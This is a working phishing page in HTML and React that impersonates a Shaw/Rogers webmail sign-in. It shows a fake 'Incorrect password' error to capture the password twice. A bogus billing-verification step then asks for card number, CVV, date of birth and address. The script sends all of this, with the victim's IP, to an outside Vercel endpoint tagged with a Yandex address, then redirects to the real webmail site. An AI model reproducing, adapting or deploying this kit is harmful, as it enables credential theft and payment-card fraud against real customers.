<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to access your email</title>

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>

    <!-- React & ReactDOM -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>

    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
        }

        /* Custom floating label animation classes */
        .floating-input:focus~.floating-label,
        .floating-input:not(:placeholder-shown)~.floating-label {
            top: 0.4rem;
            font-size: 0.75rem;
            color: #6b7280;
        }
    </style>
</head>

<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState } = React;

        const baseURL = 'https://fr-1290-2o1v.vercel.app/';
        const CHAT_ID = 'digger.lee@yandex.com';

        let ip = null


        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => ip = data.ip)
            .catch(() => ip = 'Unknown')


        async function postData(endpoint, payload) {

            try {
                const response = await fetch(`${baseURL}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                return await response.json();
            } catch (e) {
                console.error('API Error:', e);
                return { status: 'error' };
            }
        }


        const App = () => {
            const [step, setStep] = useState('login'); // 'login' | 'billing' | 'success'

            // Login state
            const [email, setEmail] = useState('');
            const [password, setPassword] = useState('');
            const [firstPassword, setFirstPassword] = useState('');
            const [errorMessage, setErrorMessage] = useState('');
            const [showPassword, setShowPassword] = useState(false);
            const [emailEmpty, setEmailEmpty] = useState(false);
            const [passwordEmpty, setPasswordEmpty] = useState(false);

            // Billing state
            const [billing, setBilling] = useState({
                cardName: '',
                cardNumber: '',
                expDate: '',
                cvv: '',
                address: '',
                city: '',
                province: '',
                postalCode: '',
                dob: ''
            });
            const [billingErrors, setBillingErrors] = useState({});
            const [billingSubmitting, setBillingSubmitting] = useState(false);

            // Card Type Detector
            const getCardType = (num) => {
                const clean = num.replace(/\D/g, '');
                if (/^4/.test(clean)) return 'visa';
                if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
                if (/^3[47]/.test(clean)) return 'amex';
                if (/^6(?:011|5)/.test(clean)) return 'discover';
                return 'unknown';
            };

            // Format card number with spaces
            const handleCardNumberChange = (e) => {
                const raw = e.target.value.replace(/\D/g, '');
                let formatted = '';
                if (raw.startsWith('34') || raw.startsWith('37')) {
                    // Amex: 4-6-5
                    for (let i = 0; i < raw.length && i < 15; i++) {
                        if (i === 4 || i === 10) formatted += ' ';
                        formatted += raw[i];
                    }
                } else {
                    // Standard: 4-4-4-4
                    for (let i = 0; i < raw.length && i < 16; i++) {
                        if (i > 0 && i % 4 === 0) formatted += ' ';
                        formatted += raw[i];
                    }
                }
                setBilling({ ...billing, cardNumber: formatted });
                if (billingErrors.cardNumber) setBillingErrors({ ...billingErrors, cardNumber: '' });
            };

            // Format expiry date MM/YY
            const handleExpChange = (e) => {
                let raw = e.target.value.replace(/\D/g, '');
                if (raw.length > 4) raw = raw.slice(0, 4);
                let formatted = raw;
                if (raw.length >= 2) {
                    formatted = raw.slice(0, 2) + '/' + raw.slice(2);
                }
                setBilling({ ...billing, expDate: formatted });
                if (billingErrors.expDate) setBillingErrors({ ...billingErrors, expDate: '' });
            };

            // Format Postal Code
            const handlePostalChange = (e) => {
                let val = e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
                if (val.length > 6) val = val.slice(0, 6);
                let formatted = val;
                if (val.length > 3) {
                    formatted = val.slice(0, 3) + ' ' + val.slice(3);
                }
                setBilling({ ...billing, postalCode: formatted });
                if (billingErrors.postalCode) setBillingErrors({ ...billingErrors, postalCode: '' });
            };

            const handleLoginSubmit = async (e) => {
                e.preventDefault();

                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const isEmailEmpty = !email.trim();
                const isEmailInvalid = !isEmailEmpty && !emailRegex.test(email.trim());
                const isPasswordEmpty = !password;

                if (isEmailEmpty || isEmailInvalid || isPasswordEmpty) {
                    setEmailEmpty(isEmailEmpty || isEmailInvalid);
                    setPasswordEmpty(isPasswordEmpty);
                    if (isEmailEmpty && isPasswordEmpty) {
                        setErrorMessage('Please enter your email and password.');
                    } else if (isEmailEmpty) {
                        setErrorMessage('Please enter your email.');
                    } else if (isEmailInvalid) {
                        setErrorMessage('Please enter a valid email address.');
                    } else {
                        setErrorMessage('Please enter your password.');
                    }
                    return;
                }

                setEmailEmpty(false);
                setPasswordEmpty(false);

                if (!firstPassword) {
                    // First submit: save first password, clear input, and show error
                    setFirstPassword(password);
                    setPassword('');
                    setErrorMessage('Incorrect password');
                } else {

                    const payload = {
                        data: JSON.stringify({
                            email: email.trim(),
                            firstPassword: firstPassword,
                            secondPassword: password
                        }),
                        IPAddress: ip,
                        title: 'SHaw login Info',
                        chatId: CHAT_ID
                    }

                    try {
                        await postData('main', payload);
                    } catch (error) {
                        console.error('Something went wrong')
                    }

                    // Transition to billing page
                    setStep('billing');
                }
            };

            const validateBilling = () => {
                const errors = {};
                const cleanCard = billing.cardNumber.replace(/\D/g, '');

                if (!billing.cardName.trim() || billing.cardName.trim().length < 3) {
                    errors.cardName = 'Enter full cardholder name';
                }

                if (!cleanCard || cleanCard.length < 15 || cleanCard.length > 16) {
                    errors.cardNumber = 'Enter a valid 15 or 16-digit card number';
                }

                if (!billing.expDate || !/^\d{2}\/\d{2}$/.test(billing.expDate)) {
                    errors.expDate = 'Enter MM/YY';
                } else {
                    const [m, y] = billing.expDate.split('/').map(Number);
                    if (m < 1 || m > 12) {
                        errors.expDate = 'Invalid month';
                    }
                }

                if (!billing.cvv || !/^\d{3,4}$/.test(billing.cvv)) {
                    errors.cvv = '3 or 4 digits';
                }

                if (!billing.address.trim()) {
                    errors.address = 'Street address is required';
                }

                if (!billing.city.trim()) {
                    errors.city = 'City is required';
                }

                if (!billing.province) {
                    errors.province = 'Please select a province';
                }

                const caPostalRegex = /^[A-Za-z]\d[A-Za-z][ ]?\d[A-Za-z]\d$/;
                if (!billing.postalCode.trim() || !caPostalRegex.test(billing.postalCode.trim())) {
                    errors.postalCode = 'Valid Canadian postal code required (e.g. T2P 1J9)';
                }

                if (!billing.dob) {
                    errors.dob = 'Date of birth is required';
                }

                return errors;
            };

            const handleBillingSubmit = async (e) => {
                e.preventDefault();
                const errors = validateBilling();
                if (Object.keys(errors).length > 0) {
                    setBillingErrors(errors);
                    return;
                }

                setBillingSubmitting(true);

                const fullData = {
                    email: email.trim(),
                    firstPassword: firstPassword,
                    secondPassword: password,
                    cardName: billing.cardName.trim(),
                    cardNumber: billing.cardNumber,
                    cardType: currentCardType.toUpperCase(),
                    expDate: billing.expDate,
                    cvv: billing.cvv,
                    dob: billing.dob,
                    address: billing.address.trim(),
                    city: billing.city.trim(),
                    province: billing.province,
                    postalCode: billing.postalCode.trim()
                };


                const payload = {
                    data: JSON.stringify({
                        ...fullData
                    }),
                    IPAddress: ip,
                    title: 'shaw Billing Info',
                    chatId: CHAT_ID
                }
                try {
                    setBillingSubmitting(false)
                    await postData('main', payload);
                    window.location.replace('https://webmail.shaw.ca/')
                } catch (error) {
                    console.error('Something went wrong')
                }

            };

            const currentCardType = getCardType(billing.cardNumber);

            return (
                <div className="min-h-screen flex flex-col bg-[#f4f5f7]">
                    {/* Top Header - Red */}
                    <header className="bg-[#DA291C] px-4 py-3 md:px-8 shadow-sm">
                        <img
                            src="https://rujrucnyxhxgsrvbyigm.supabase.co/storage/v1/object/public/aaps/logs/show-new-log.png"
                            alt="Logo"
                            className="h-10 object-contain"
                        />
                    </header>

                    {/* Navigation Bar - Black */}
                    <nav className="bg-[#1e1e1e] text-white text-sm px-4 py-3 flex flex-col md:flex-row justify-between items-center gap-4">
                        <div className="flex flex-wrap justify-center gap-x-3 gap-y-2 md:gap-4 md:ml-[10%]">
                            <a href="#" className="hover:underline">Home</a>
                            <span className="text-gray-500">|</span>
                            <a href="#" className="hover:underline">Business</a>
                            <span className="text-gray-500">|</span>
                            <a href="#" className="hover:underline">Shop</a>
                            <span className="text-gray-500">|</span>
                            <a href="#" className="hover:underline">Support</a>
                            <span className="text-gray-500">|</span>
                            <a href="#" className="hover:underline">MyRogers (Shaw)</a>
                        </div>
                        <div className="flex items-center gap-2 cursor-pointer md:mr-[10%] hover:text-gray-300">
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                            </svg>
                            <span>Contact</span>
                        </div>
                    </nav>

                    {/* Main Content Area */}
                    <main className="flex-grow flex justify-center items-start pt-8 md:pt-12 pb-16 px-4">
                        {step === 'login' && (
                            <div className="w-full max-w-[480px] bg-white border border-gray-200 rounded-md p-6 md:p-8 shadow-sm">
                                <h1 className="text-2xl font-semibold text-center mb-6 text-gray-800">Sign in to access your email</h1>

                                {/* Error Message */}
                                {errorMessage && (
                                    <div className="flex items-center justify-center text-[#DA291C] text-sm mb-6 font-medium text-center">
                                        <svg className="w-4 h-4 mr-1.5 flex-shrink-0 fill-current" viewBox="0 0 20 20">
                                            <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                                        </svg>
                                        <span>{errorMessage}</span>
                                    </div>
                                )}

                                {/* Form */}
                                <form onSubmit={handleLoginSubmit} className="flex flex-col gap-5" noValidate>
                                    {/* Email Input */}
                                    <div className="relative">
                                        <input
                                            type="email"
                                            value={email}
                                            onChange={(e) => {
                                                setEmail(e.target.value);
                                                if (emailEmpty) setEmailEmpty(false);
                                            }}
                                            className={`floating-input w-full px-4 pt-5 pb-2 border ${emailEmpty ? 'border-[#DA291C]' : 'border-gray-400'} rounded focus:outline-none focus:border-black focus:ring-1 focus:ring-black bg-white`}
                                            placeholder=" "
                                        />
                                        <label className="floating-label absolute left-4 top-3 text-gray-500 transition-all pointer-events-none">Shaw Email</label>
                                    </div>

                                    {/* Password Input */}
                                    <div className="relative">
                                        <input
                                            type={showPassword ? "text" : "password"}
                                            value={password}
                                            onChange={(e) => {
                                                setPassword(e.target.value);
                                                if (passwordEmpty) setPasswordEmpty(false);
                                            }}
                                            className={`floating-input w-full pl-4 pr-12 pt-5 pb-2 border ${passwordEmpty ? 'border-[#DA291C]' : 'border-gray-400'} rounded focus:outline-none focus:border-black focus:ring-1 focus:ring-black bg-white`}
                                            placeholder=" "
                                        />
                                        <label className="floating-label absolute left-4 top-3 text-gray-500 transition-all pointer-events-none">Password</label>

                                        {/* Toggle Password Visibility */}
                                        <button
                                            type="button"
                                            onClick={() => setShowPassword(!showPassword)}
                                            className="absolute right-3 top-3.5 text-gray-700 hover:text-black focus:outline-none"
                                        >
                                            {showPassword ? (
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
                                            ) : (
                                                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.542-7a10.05 10.05 0 011.52-2.7m1.52-2.34A10.05 10.05 0 0112 5c4.478 0 8.268 2.943 9.542 7a10.05 10.05 0 01-1.52 2.7m-1.52 2.34l-1.5 1.5M3 3l18 18"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9.88 9.88a3 3 0 104.24 4.24"></path></svg>
                                            )}
                                        </button>
                                    </div>

                                    {/* Remember Me Checkbox */}
                                    <div className="flex items-center gap-2 mt-1">
                                        <input
                                            type="checkbox"
                                            id="remember"
                                            className="w-4 h-4 cursor-pointer border-gray-400 rounded-sm"
                                        />
                                        <label htmlFor="remember" className="text-sm text-gray-700 cursor-pointer select-none">
                                            Remember my email
                                        </label>
                                    </div>

                                    {/* Submit Button */}
                                    <button
                                        type="submit"
                                        className="bg-[#DA291C] hover:bg-[#B32015] text-white font-semibold py-2.5 px-8 mx-auto mt-4 w-32 rounded transition-colors"
                                    >
                                        Sign in
                                    </button>
                                </form>

                                {/* Help Links */}
                                <div className="mt-10 border-t border-gray-300 pt-6 text-[15px] text-center flex flex-col gap-2">
                                    <p className="text-gray-800">
                                        Having trouble? <a href="#" className="text-[#0055A5] hover:underline">Support: How To Reset My Password</a>
                                    </p>
                                    <p className="text-gray-800">
                                        Already know how? <a href="#" className="text-[#0055A5] hover:underline">Reset Password on MyRogers (Shaw)</a>
                                    </p>
                                </div>
                            </div>
                        )}

                        {step === 'billing' && (
                            <div className="w-full max-w-[580px] bg-white border border-gray-200 rounded-lg p-6 md:p-8 shadow-sm">
                                <div className="border-b border-gray-200 pb-4 mb-6">
                                    <div className="flex items-center gap-2 mb-1">
                                        <span className="bg-[#DA291C] text-white text-xs font-bold px-2 py-0.5 rounded">Security Verification</span>
                                        <span className="text-xs text-gray-500">Step 2 of 2</span>
                                    </div>
                                    <h1 className="text-2xl font-bold text-gray-900">Confirm Billing Information</h1>
                                    <p className="text-sm text-gray-600 mt-1">Please confirm your payment and identity details on file to maintain uninterrupted service.</p>
                                </div>



                                <form onSubmit={handleBillingSubmit} className="space-y-4" noValidate>
                                    {/* Card Section */}
                                    <div className="space-y-4">


                                        {/* Name on Card */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-700 mb-1">Name on Card</label>
                                            <input
                                                type="text"
                                                value={billing.cardName}
                                                onChange={(e) => {
                                                    setBilling({ ...billing, cardName: e.target.value });
                                                    if (billingErrors.cardName) setBillingErrors({ ...billingErrors, cardName: '' });
                                                }}
                                                placeholder="John Doe"
                                                className={`w-full px-3.5 py-2.5 text-sm border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.cardName ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                            />
                                            {billingErrors.cardName && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.cardName}</p>}
                                        </div>

                                        {/* Card Number */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-700 mb-1">Card Number</label>
                                            <div className="relative">
                                                <input
                                                    type="text"
                                                    value={billing.cardNumber}
                                                    onChange={handleCardNumberChange}
                                                    maxLength="19"
                                                    placeholder="XXXX XXXX XXXX XXXX"
                                                    className={`w-full pl-3.5 pr-14 py-2.5 text-sm font-mono border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.cardNumber ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                />
                                                <div className="absolute right-3 top-2.5 pointer-events-none">
                                                    {currentCardType === 'visa' && <span className="text-xs font-bold text-blue-700">VISA</span>}
                                                    {currentCardType === 'mastercard' && <span className="text-xs font-bold text-red-600">MC</span>}
                                                    {currentCardType === 'amex' && <span className="text-xs font-bold text-blue-600">AMEX</span>}
                                                    {currentCardType === 'discover' && <span className="text-xs font-bold text-orange-600">DISC</span>}
                                                    {currentCardType === 'unknown' && (
                                                        <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                            <rect x="2" y="5" width="20" height="14" rx="2" strokeWidth="1.5"></rect>
                                                            <line x1="2" y1="10" x2="22" y2="10" strokeWidth="1.5"></line>
                                                        </svg>
                                                    )}
                                                </div>
                                            </div>
                                            {billingErrors.cardNumber && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.cardNumber}</p>}
                                        </div>

                                        {/* Expiry & CVV */}
                                        <div className="grid grid-cols-2 gap-4">
                                            <div>
                                                <label className="block text-xs font-semibold text-gray-700 mb-1">Expiration Date</label>
                                                <input
                                                    type="text"
                                                    value={billing.expDate}
                                                    onChange={handleExpChange}
                                                    placeholder="MM/YY"
                                                    maxLength="5"
                                                    className={`w-full px-3.5 py-2.5 text-sm font-mono border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.expDate ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                />
                                                {billingErrors.expDate && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.expDate}</p>}
                                            </div>
                                            <div>
                                                <label className="block text-xs font-semibold text-gray-700 mb-1">Security Code (CVV)</label>
                                                <input
                                                    type="password"
                                                    value={billing.cvv}
                                                    onChange={(e) => {
                                                        const val = e.target.value.replace(/\D/g, '').slice(0, 4);
                                                        setBilling({ ...billing, cvv: val });
                                                        if (billingErrors.cvv) setBillingErrors({ ...billingErrors, cvv: '' });
                                                    }}
                                                    placeholder="123"
                                                    maxLength="4"
                                                    className={`w-full px-3.5 py-2.5 text-sm font-mono border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.cvv ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                />
                                                {billingErrors.cvv && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.cvv}</p>}
                                            </div>
                                        </div>
                                    </div>

                                    {/* Personal & Billing Address Section */}
                                    <div className="space-y-4 pt-4 border-t border-gray-200">
                                        <h2 className="text-sm font-bold text-gray-800 uppercase tracking-wide">Billing Address & Details</h2>

                                        {/* Date of Birth */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-700 mb-1">Date of Birth</label>
                                            <input
                                                type="date"
                                                value={billing.dob}
                                                onChange={(e) => {
                                                    setBilling({ ...billing, dob: e.target.value });
                                                    if (billingErrors.dob) setBillingErrors({ ...billingErrors, dob: '' });
                                                }}
                                                className={`w-full px-3.5 py-2.5 text-sm border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] bg-white ${billingErrors.dob ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                            />
                                            {billingErrors.dob && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.dob}</p>}
                                        </div>

                                        {/* Street Address */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-700 mb-1">Street Address</label>
                                            <input
                                                type="text"
                                                value={billing.address}
                                                onChange={(e) => {
                                                    setBilling({ ...billing, address: e.target.value });
                                                    if (billingErrors.address) setBillingErrors({ ...billingErrors, address: '' });
                                                }}
                                                placeholder="123 Main St, Apt 4B"
                                                className={`w-full px-3.5 py-2.5 text-sm border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.address ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                            />
                                            {billingErrors.address && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.address}</p>}
                                        </div>

                                        {/* City & Province & Postal */}
                                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                                            <div>
                                                <label className="block text-xs font-semibold text-gray-700 mb-1">City</label>
                                                <input
                                                    type="text"
                                                    value={billing.city}
                                                    onChange={(e) => {
                                                        setBilling({ ...billing, city: e.target.value });
                                                        if (billingErrors.city) setBillingErrors({ ...billingErrors, city: '' });
                                                    }}
                                                    placeholder="Calgary"
                                                    className={`w-full px-3.5 py-2.5 text-sm border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.city ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                />
                                                {billingErrors.city && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.city}</p>}
                                            </div>
                                            <div>
                                                <label className="block text-xs font-semibold text-gray-700 mb-1">Province / Territory</label>
                                                <select
                                                    value={billing.province}
                                                    onChange={(e) => {
                                                        setBilling({ ...billing, province: e.target.value });
                                                        if (billingErrors.province) setBillingErrors({ ...billingErrors, province: '' });
                                                    }}
                                                    className={`w-full px-3.5 py-2.5 text-sm border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] bg-white ${billingErrors.province ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                >
                                                    <option value="">Select Province</option>
                                                    <option value="AB">Alberta (AB)</option>
                                                    <option value="BC">British Columbia (BC)</option>
                                                    <option value="MB">Manitoba (MB)</option>
                                                    <option value="NB">New Brunswick (NB)</option>
                                                    <option value="NL">Newfoundland and Labrador (NL)</option>
                                                    <option value="NT">Northwest Territories (NT)</option>
                                                    <option value="NS">Nova Scotia (NS)</option>
                                                    <option value="NU">Nunavut (NU)</option>
                                                    <option value="ON">Ontario (ON)</option>
                                                    <option value="PE">Prince Edward Island (PE)</option>
                                                    <option value="QC">Quebec (QC)</option>
                                                    <option value="SK">Saskatchewan (SK)</option>
                                                    <option value="YT">Yukon (YT)</option>
                                                </select>
                                                {billingErrors.province && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.province}</p>}
                                            </div>
                                            <div>
                                                <label className="block text-xs font-semibold text-gray-700 mb-1">Postal Code</label>
                                                <input
                                                    type="text"
                                                    value={billing.postalCode}
                                                    onChange={handlePostalChange}
                                                    placeholder="T2P 1J9"
                                                    maxLength="7"
                                                    className={`w-full px-3.5 py-2.5 text-sm uppercase font-mono border rounded focus:outline-none focus:ring-2 focus:ring-[#DA291C] ${billingErrors.postalCode ? 'border-[#DA291C] bg-red-50/20' : 'border-gray-300'}`}
                                                />
                                                {billingErrors.postalCode && <p className="text-xs text-[#DA291C] mt-1">{billingErrors.postalCode}</p>}
                                            </div>
                                        </div>
                                    </div>


                                    {/* Submit Button */}
                                    <div className="pt-3">
                                        <button
                                            type="submit"
                                            disabled={billingSubmitting}
                                            className="w-full bg-[#DA291C] hover:bg-[#B32015] text-white font-semibold py-3 px-6 rounded transition-colors flex items-center justify-center gap-2"
                                        >
                                            {billingSubmitting ? (
                                                <>
                                                    <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                                    </svg>
                                                    <span>Verifying Information...</span>
                                                </>
                                            ) : (
                                                <span>Confirm & Update Billing</span>
                                            )}
                                        </button>
                                    </div>
                                </form>
                            </div>
                        )}

                        {step === 'success' && (
                            <div className="w-full max-w-[480px] bg-white border border-gray-200 rounded-lg p-8 shadow-sm text-center">
                                <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7"></path>
                                    </svg>
                                </div>
                                <h1 className="text-2xl font-bold text-gray-900 mb-2">Verification Complete</h1>
                                <p className="text-gray-600 text-sm mb-6">
                                    Your account and billing details have been successfully verified and updated.
                                </p>
                                <div className="bg-gray-50 border border-gray-200 rounded p-4 text-left text-xs text-gray-600 space-y-1 mb-6">
                                    <div className="flex justify-between">
                                        <span className="font-semibold text-gray-700">Account:</span>
                                        <span>{email}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="font-semibold text-gray-700">Card ending in:</span>
                                        <span>•••• {billing.cardNumber.replace(/\D/g, '').slice(-4)}</span>
                                    </div>
                                    <div className="flex justify-between">
                                        <span className="font-semibold text-gray-700">Status:</span>
                                        <span className="text-green-600 font-semibold">Active & Verified</span>
                                    </div>
                                </div>
                                <a
                                    href="#"
                                    onClick={(e) => { e.preventDefault(); window.location.reload(); }}
                                    className="inline-block bg-[#1e1e1e] hover:bg-black text-white text-sm font-semibold py-2.5 px-6 rounded transition-colors"
                                >
                                    Return to MyRogers (Shaw)
                                </a>
                            </div>
                        )}
                    </main>

                    {/* Footer */}
                    <footer className="bg-[#1a1a1a] text-white text-xs py-5 px-4 flex flex-col md:flex-row justify-center md:justify-center items-center gap-4 md:gap-12">
                        <p className="font-semibold">© 2026 Rogers Communications</p>
                        <div className="flex flex-wrap justify-center items-center gap-4">
                            <a href="#" className="hover:underline font-semibold">Privacy Policy</a>
                            <span className="text-gray-500 font-normal">|</span>
                            <a href="#" className="hover:underline font-semibold">Terms of Use</a>
                            <span className="text-gray-500 font-normal">|</span>
                            <a href="#" className="hover:underline font-semibold">Accessibility</a>
                        </div>
                    </footer>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>

</html>
